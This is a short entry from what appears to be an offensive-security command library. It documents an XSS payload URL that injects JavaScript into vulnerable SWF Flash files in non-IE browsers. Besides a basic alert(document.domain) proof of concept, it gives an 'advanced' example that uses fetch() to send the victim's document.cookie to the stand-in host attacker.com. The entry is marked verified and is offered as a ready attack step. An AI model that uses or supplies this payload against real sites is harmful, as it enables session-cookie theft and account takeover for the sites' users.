---
type: command
executor: browser
data: 'http://0me.me/demo/xss/xssproject.swf?js=alert(document.domain);'
tags:
  - xss
  - swf-flash
platforms:
  - web
  - browser
verified: true
validated: true
---

# xss-swf-payload-non-ie-browsers

## Command

Visit the following URL in a non-IE browser:

```
http://0me.me/demo/xss/xssproject.swf?js=alert(document.domain);
```

## Description

This command provides a URL payload for executing XSS in SWF Flash applications on browsers other than Internet Explorer. It injects JavaScript via the 'js' parameter, which the vulnerable SWF executes upon loading.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| js | JavaScript code to inject and execute | Yes |
| SWF URL base | Base URL of the vulnerable SWF file (e.g., http://0me.me/demo/xss/xssproject.swf) | Yes |

## Examples

### Basic Usage

```
http://0me.me/demo/xss/xssproject.swf?js=alert(document.domain);
```

### Advanced Usage (Data Exfiltration)

```
http://0me.me/demo/xss/xssproject.swf?js=fetch('http://attacker.com/steal?data='+encodeURIComponent(document.cookie));
```

## Expected Output

Upon visiting the URL, a JavaScript alert dialog appears displaying the current document's domain (e.g., 'example.com'). If customized for exfiltration, a network request is sent to the attacker's server with stolen data like cookies.

## Related

- [[procedures/Exploit-XSS-in-SWF-Flash-Application]]
